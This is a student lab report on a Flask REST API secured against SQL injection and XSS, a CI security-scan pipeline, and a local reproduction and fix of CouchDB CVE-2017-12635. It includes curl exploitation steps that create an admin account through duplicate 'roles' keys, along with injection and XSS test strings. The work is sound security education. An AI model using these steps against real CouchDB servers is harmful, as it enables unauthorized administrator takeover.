# Laboratory Work No. 1

## Secure REST API Development with CI/CD and CVE Analysis

| Field | Value |
|---|---|
| Variant number | CVE-2017-12635 |
| Student surname and name | Guo Ruihao |
| HDU number | 23320309 |
| Group | — |
| Date | 2026-10-19 |
| Repository | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |
| CI run | <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39197917908> |

## 1. Purpose

The purpose of this work is to build a small secure REST API, add automatic
security checks to CI, and reproduce and fix a real CVE in a Docker
environment.

## 2. Environment

- Windows 11, Python 3.11
- Flask 3.1, SQLite
- bcrypt, PyJWT
- pytest, Bandit, pip-audit
- Docker Desktop, Docker Compose
- Git and GitHub Actions

## 3. API

The API is implemented in one file, `app.py`.

| Method | Path | Authentication | Purpose |
|---|---|---|---|
| POST | `/auth/login` | No | Check login and password, return a JWT |
| GET | `/api/data` | Bearer JWT | Return posts; `?q=` searches |
| POST | `/api/data` | Bearer JWT | Create a post |
| GET | `/health` | No | Health check |

The database is SQLite. Demo users are created on first start:
`alice / AlicePass123!` (admin) and `bob / BobPass123!` (user).

## 4. Security measures

### SQL injection

All SQL statements use bound parameters:

```python
db.execute("SELECT * FROM users WHERE username = ?", (username,))
```

The search endpoint also uses two `?` placeholders. A test sends
`' OR 1=1 --` and checks that it returns zero rows.

### XSS

Text from the database is escaped before it is returned:

```python
html.escape(row["title"])
```

The test stores `<script>alert(1)</script>` and checks that the response
contains `&lt;script&gt;`.

### Authentication

- Passwords are hashed with bcrypt.
- Login returns a JWT signed with HS256.
- The token expires after 30 minutes.
- Protected routes verify the token with `jwt.decode(..., algorithms=["HS256"])`.
- A missing or invalid token returns `401`.

## 5. CI/CD

`.github/workflows/ci.yml` runs on every push:

| Step | Result |
|---|---|
| `pytest -q` | 6 passed |
| `bandit app.py` | no issues identified |
| `pip-audit -r requirements.txt` | no known vulnerabilities |

The Bandit and pip-audit JSON reports are uploaded as the
`security-reports` artifact.

Successful run:
<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39197917908>

## 6. CVE-2017-12635

### 6.1 Description

CVE-2017-12635 is a privilege escalation vulnerability in Apache CouchDB
before 1.7.0 and 2.x before 2.1.1. A user document with duplicate `roles`
keys is parsed differently by the Erlang authorization code and the
JavaScript storage code. The authorization check sees `["_admin"]`, while the
stored document sees `[]`, so an unauthenticated attacker can create an
administrator account.

### 6.2 Vulnerable environment

```bash
cd vulhub/couchdb/CVE-2017-12635
docker compose up -d
```

The service listens on `http://127.0.0.1:5984`.

On Windows, `init.sh` may have CRLF line endings and fail with
`$'\r': command not found`. Converting it to LF fixes the init container.

### 6.3 Reproduction

A normal request with an admin role is rejected:

```bash
curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
  -H "Content-Type: application/json" \
  --data-binary @cve/normal_user.json
```

```text
HTTP/1.1 403 Forbidden
{"error":"forbidden","reason":"Only _admin may set roles"}
```

A request with duplicate `roles` keys succeeds:

```bash
curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
  -H "Content-Type: application/json" \
  --data-binary @cve/duplicate_roles.json
```

```text
HTTP/1.1 201 Created
{"ok":true,"id":"org.couchdb.user:vulhub",...}
```

The new account has the admin role:

```bash
curl -u vulhub:vulhub http://127.0.0.1:5984/_session
```

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
```

The account can create a database, which is an admin action:

```text
PUT /evil_db -> HTTP/1.1 201 Created
```

### 6.4 Root cause

The vulnerability is a **parser differential**. CouchDB uses more than one
JSON parser. The Erlang parser used for the authorization check keeps the
first `roles` key, while the JavaScript parser used for the stored document
keeps the last one. Both parts of the program believe they are working with
the same document, but they see different roles.

### 6.5 Fix

The fixed environment uses CouchDB 2.1.1:

```bash
docker compose -f cve/fixed/docker-compose.yml up -d
```

The patched version still accepts the duplicate key, but both parsers now
use the same value. The stored document has `"roles":[]`, and the session
has no admin role.

This is a good fix because it removes the parser disagreement without
changing the normal registration workflow.

### 6.6 Verification

| Check | CouchDB 2.1.0 | CouchDB 2.1.1 |
|---|---|---|
| Normal admin request | 403 | 403 |
| Duplicate `roles` request | 201 | 201 |
| Session roles | `["_admin"]` | `[]` |
| Create database | 201 | 401 |
| Normal user registration | 201 | 201 |

The last row is the regression test: ordinary registration still works after
the fix.

### 6.7 Screenshots

![Vulnerable CouchDB](docs/screenshots/cve-before.png)

![Fixed CouchDB](docs/screenshots/cve-after.png)

![GitHub Actions](docs/screenshots/ci-success.png)

## 7. Conclusion

The API demonstrates basic protections against SQL injection, XSS, and broken
authentication. GitHub Actions repeats the tests and security scans on every
push. The CVE part shows that a parser difference can break an access-control
check even when the application logic looks correct. Upgrading CouchDB to
2.1.1 removes the privilege escalation, and normal user registration still
works.

## 8. Submission checklist

- [x] Public GitHub repository.
- [x] Successful GitHub Actions run.
- [x] API source code and tests.
- [x] CVE reproduction and fix.
- [x] Evidence screenshots.
- [x] Variant, surname, name, and HDU number filled in.
